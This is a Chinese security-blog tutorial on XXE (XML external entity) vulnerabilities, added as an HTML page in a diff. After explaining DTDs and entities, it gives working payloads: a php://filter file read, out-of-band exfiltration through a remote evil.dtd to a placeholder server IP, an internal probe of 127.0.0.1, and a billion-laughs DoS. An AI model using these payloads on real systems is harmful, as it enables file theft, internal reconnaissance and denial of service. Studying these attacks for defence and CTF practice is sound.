@@ -1,0 +1,203 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XXE漏洞利用 | 掌门のblog</title><meta name="author" content="仙人掌门"><meta name="copyright" content="仙人掌门"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XXE漏洞简述定义XXE漏洞（XML External Entity Injection）是一种常见的网络安全漏洞，主要发生在应用程序解析XML输入时。该漏洞的成因是应用程序没有对外部实体进行限制或过滤，导致攻击者可以注入恶意的外部实体，从而执行一系列危害性操作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞利用">
+<meta property="og:url" content="https://xrzmblog.cn/posts/4120014032.html">
+<meta property="og:site_name" content="掌门のblog">
+<meta property="og:description" content="XXE漏洞简述定义XXE漏洞（XML External Entity Injection）是一种常见的网络安全漏洞，主要发生在应用程序解析XML输入时。该漏洞的成因是应用程序没有对外部实体进行限制或过滤，导致攻击者可以注入恶意的外部实体，从而执行一系列危害性操作">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xrzmblog.cn/img/avatar.png">
+<meta property="article:published_time" content="2024-06-16T03:45:10.000Z">
+<meta property="article:modified_time" content="2024-06-17T11:34:39.544Z">
+<meta property="article:author" content="仙人掌门">
+<meta property="article:tag" content="web攻防">
+<meta property="article:tag" content="web漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xrzmblog.cn/img/avatar.png"><link rel="shortcut icon" href="/img/Z(32).png"><link rel="canonical" href="https://xrzmblog.cn/posts/4120014032.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><meta name="baidu-site-verification" content="codeva-4E4lrwunJh"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a8ef2d4c869b68eb48bef2f0cb6c08c0";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 仙人掌门","link":"链接: ","source":"来源: 掌门のblog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XXE漏洞利用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-17 19:34:39'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.png')"><nav id="nav"><span id="blog-info"><a href="/" title="掌门のblog"><span class="site-name">掌门のblog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XXE漏洞利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-16T03:45:10.000Z" title="发表于 2024-06-16 11:45:10">2024-06-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-17T11:34:39.544Z" title="更新于 2024-06-17 19:34:39">2024-06-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E6%BC%8F%E6%B4%9E/">web漏洞</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="XXE漏洞简述"><a href="#XXE漏洞简述" class="headerlink" title="XXE漏洞简述"></a>XXE漏洞简述</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>XXE漏洞（<strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity Injection）是一种常见的网络安全漏洞，主要发生在应用程序解析XML输入时。该漏洞的成因是应用程序没有对外部实体进行限制或过滤，导致攻击者可以注入恶意的外部实体，从而执行一系列危害性操作</p>
+<span id="more"></span>
+<br>
+
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XXE漏洞的<strong>核心原理是利用XML文档中的DTD（文档类型定义）部分来引入外部实体。</strong>攻击者通过构造特定的<strong>XML文档</strong>，包含恶意的外部实体引用，使得服务器在解析这些XML文档时，会按照这些外部实体的配置执行，从而达到读取文件、执行系统命令、内网探测等目的。</p>
+<p>所以，这里先对XML文档和XML文档中的DTD做一些解释。<br><br></p>
+<h3 id="XML文档"><a href="#XML文档" class="headerlink" title="XML文档"></a>XML文档</h3><p>XML 指可扩展标记语言（eXtensible Markup Language）。<br>XML 被设计<strong>用来传输和存储数据</strong>，不用于表现和展示数据，HTML 则用来表现数据。</p>
+<p>下面是一个简单的XML实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">body</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">warning</span> <span class="string">&quot;Warning: Something bad happened... please refresh and try again.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">message</span>&gt;</span> <span class="symbol">&amp;warning;</span> <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<br>
+
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）是XXE漏洞的重点利用对象，DTD用来为XML文档定义语义约束。可以嵌入在XML文档中（内部声明），也可以独立的放在一个文件中（外部引用）。</p>
+<p>DTD中一些重要的关键字包括：<br>DOCTYPE（DTD的声明）<br>ENTITY（实体的声明）<br>SYSTEM、PUBLIC（外部资源申请）  </p>
+<p>1、DTD文档声明方式区别：<br>内部文档：<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+<p>外部文档：<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code></p>
+<p>内外部文档结合:<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></p>
+<p>2、参数实体声明:</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span></span><br><span class="line"><span class="language-xml">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>hello<span class="string">&quot;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">    %b;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">]&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>参数实体</strong>用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。<br><strong>其余实体</strong>直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</p>
+<p>外部引用可支持http、file等协议，不同的语言支持的协议不同，但存在一些通用的协议。例如：<br><img src="/posts/4120014032/1.png"></p>
+<p>上图是默认支持协议，还可以支持其他协议，如PHP支持的扩展协议有：<br><img src="/posts/4120014032/2.png"><br><br></p>
+<h3 id="XXE漏洞的危害"><a href="#XXE漏洞的危害" class="headerlink" title="XXE漏洞的危害"></a>XXE漏洞的危害</h3><p>XXE漏洞可能导致以下严重后果：<br><strong>文件读取：</strong>攻击者可以读取服务器上的任意文件，包括配置文件、日志文件等。<br><strong>命令执行：</strong>攻击者可以执行系统命令，进行远程代码执行。<br><strong>内网渗透：</strong>攻击者可以探测内网端口，甚至攻击内网网站。<br><strong>拒绝服务攻击（DoS）：</strong>攻击者可以发起拒绝服务攻击，导致目标系统瘫痪。<br><br></p>
+<h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>利用file、http协议，在DTD外部引用中注入，从而获取文件内容。任意文件读取有分为<strong>有回显</strong>和<strong>无回显</strong>两种。</p>
+<h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><p>直接读取文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里将网站中的flag.php文件以base64编码的方式取出，赋值给了实体f，<br>然后实体f的值作为元素x中的字符串数据被php解析的时候取出，作为对象里的内容，最后被打印出来。<br><br></p>
+<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p>没有回显的话可以把数据发送到远程服务器:<br>1.<strong>利用file等协议</strong>去读取本地文件<br>2.<strong>利用http协议</strong>带出实体  </p>
+<p>所以这里需要两个payload：</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml verstion=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span>[</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://远程服务器ip/evil.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">        %dtd;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">        %send;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>远程服务器的evil.dtd文件内容（evil.dtd内部的%号要进行实体编码成&amp;#x25。）：  </p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://远程服务器ip/?data=%file;&#x27;&gt;&quot;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%all;</span></span><br></pre></td></tr></table></figure>
+<p>执行流程：<br>1、php过滤器将flag进行base64编码后赋值给<code>%file</code>实体<br>2、解析<code>%dtd</code>时，将会访问远程服务器的<code>evil.dtd</code>文件<br>3、在<code>evil.dtd</code>内解析<code>%all</code>实体时，会将<code>%file</code>实体带入<br>4、通过访问指定的链接，将数据赋给<code>%send</code><br>5、访问接受数据的服务器中的日志信息，可以看到数据。<br><br></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>XXE漏洞造成命令执行很少见，要求在php环境下，xml要装有expect扩展，然而该扩展默认是没有安装的,所以这里不进行讲解。</p>
+<h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>这里其实和读取文件类似，只不过文件地址变成了url</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h3><p>这个方法通过创建大量的实体引用，耗尽系统资源，导致拒绝服务.</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=&quot;<span class="number">1.0</span>&quot;?&gt;</span></span><br><span class="line"><span class="params">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="params">  &lt;!ENTITY a &quot;a&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY b &quot;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY c &quot;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY d &quot;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY e &quot;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY f &quot;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY g &quot;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY h &quot;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY i &quot;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY j &quot;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY k &quot;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;data&gt;</span><span class="variable">&amp;k</span><span class="punctuation">;</span><span class="params">&lt;/data&gt;</span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xrzmblog.cn">仙人掌门</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xrzmblog.cn/posts/4120014032.html">https://xrzmblog.cn/posts/4120014032.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xrzmblog.cn" target="_blank">掌门のblog</a>！</span></div></div><div class="tag_share"><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/1355767420.html" title="SSRF漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SSRF漏洞</div></div></a></div><div class="next-post pull-right"><a href="/posts/2308381537.html" title="CTF_RCE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF_RCE</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/1355767420.html" title="SSRF漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-17</div><div class="title">SSRF漏洞</div></div></a></div><div><a href="/posts/1082777166.html" title="文件包含漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-07</div><div class="title">文件包含漏洞</div></div></a></div><div><a href="/posts/2211845110.html" title="php序列化和反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-24</div><div class="title">php序列化和反序列化</div></div></a></div><div><a href="/posts/154257042.html" title="文件上传漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-21</div><div class="title">文件上传漏洞</div></div></a></div><div><a href="/posts/3320036978.html" title="SSTI模版注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-18</div><div class="title">SSTI模版注入</div></div></a></div><div><a href="/posts/2308381537.html" title="CTF_RCE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-20</div><div class="title">CTF_RCE</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">仙人掌门</div><div class="author-info__description">记录学习的过程</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xrzm"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xrzm" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1464947922@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">XXE漏洞简述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.1.</span> 